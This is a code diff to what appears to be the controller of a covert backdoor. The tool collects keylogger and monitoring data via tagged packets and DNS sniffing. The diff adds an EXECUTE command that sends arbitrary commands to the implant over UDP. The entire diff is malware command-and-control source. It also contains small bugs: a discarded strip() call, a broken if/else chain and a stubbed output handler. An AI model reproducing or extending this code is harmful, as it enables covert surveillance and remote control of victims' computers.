@@ -57,6 +57,7 @@ BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
 MONITOR_IDENTIFICATION = 14562
 KEYLOG_IDENTIFICATION = 32586
 GENERAL_MSG_IDENTIFICATION = 19375
+COMMAND_OUTPUT_IDENTIFICATION = 51486
 
 
 # Initialize the encryption context.
@@ -88,6 +89,8 @@ def subprocess_packet_handler(pkt):
         write_keylog_data(encrypted_message)
     if pkt[IP].id == MONITOR_IDENTIFICATION:
         write_monitor_data(encrypted_message)
+    if pkt[IP].id == COMMAND_OUTPUT_IDENTIFICATION:
+        pass
 
 
 def write_keylog_data(data):
@@ -143,6 +146,15 @@ def receive_single_response():
     print("Timed out waiting for response...")
 
 
+def arg_list_to_string(args: list):
+    result = ""
+    for arg in args:
+        result += arg
+        result += " "
+    result.strip()
+    return result
+
+
 if __name__ == "__main__":
 
     # Start the secondary process which sniffs for DNS requests from the backdoor,
@@ -180,6 +192,9 @@ if __name__ == "__main__":
                 send_udp(data)
                 receive_single_response()
                 continue
+        if argv[0] == EXECUTE:
+            data = argv[0] + " " + arg_list_to_string(argv[1:])
+            send_udp(data)
         else:
             print(f"Invalid Command: {command}")
     decode_process.kill()
